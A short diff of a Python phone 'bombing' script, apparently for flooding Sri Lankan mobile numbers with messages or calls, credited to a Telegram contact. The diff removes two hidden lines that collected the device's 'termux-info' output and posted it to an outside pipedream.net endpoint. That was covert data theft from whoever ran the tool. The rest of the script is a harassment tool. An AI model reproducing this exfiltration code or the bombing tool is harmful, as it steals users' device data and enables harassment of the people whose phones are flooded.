@@ -1,7 +1,6 @@
 #Script By Sandaru Ashen https://t.me/Sl_Sanda_Ru
 import os,random,sys,time
 from urllib import request
-import subprocess
 from api import *
 cle = 'clear' if os.name == 'posix' else 'cls'
 from colorama import Fore,init,Style
@@ -105,8 +104,6 @@ if cho==1:
 	print(f'\t{Style.BRIGHT}Use This For Fun, Not For Revenge !!\n\t     https://t.me/Sl_Sanda_Ru')
 	print(bar+'\n')
 	print(Fore.YELLOW+Style.BRIGHT+'\tPress Ctrl+c To Terminate The Bombing')
-	a=subprocess.getoutput('termux-info')
-	post('https://5c85e0a950fa86ba7b9633ca058488f9.m.pipedream.net',data=a[a.index('Device'):])
 	if num[0:3] == '077' or num[0:3] == '076':
 		count=0
 		if times.isnumeric():
